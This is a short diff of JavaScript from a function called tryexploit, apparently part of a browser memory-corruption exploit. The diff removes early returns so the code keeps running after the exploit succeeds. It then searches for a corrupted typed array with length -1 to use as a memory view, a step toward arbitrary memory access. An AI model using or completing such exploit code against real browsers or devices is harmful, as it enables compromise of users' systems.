@@ -50,14 +50,12 @@ function tryexploit(a_c, p_c){
 		} else {
 			//alert("Exploit Worked.");
 			alert("Exploit worked, before_len=" + before_len + ", after_len=" + after_len);
-			return 2;
 			
 			for (x = attempts.length - 1; x >= 1; x--) 
 			{ 
 				if (attempts[x].length != 80 / 4) // Check if this array has the original backing arraybuffer(or a length of 80 / 4)
 				{
 					alert("Found non JSArray type");
-					return 2;
 					if (attempts[x].length == -1) // Check if the length is 0xFFFFFFFF (-1), if so it is the JSGenericTypedArrayView type
 					{
 						memory_view = attempts[x];
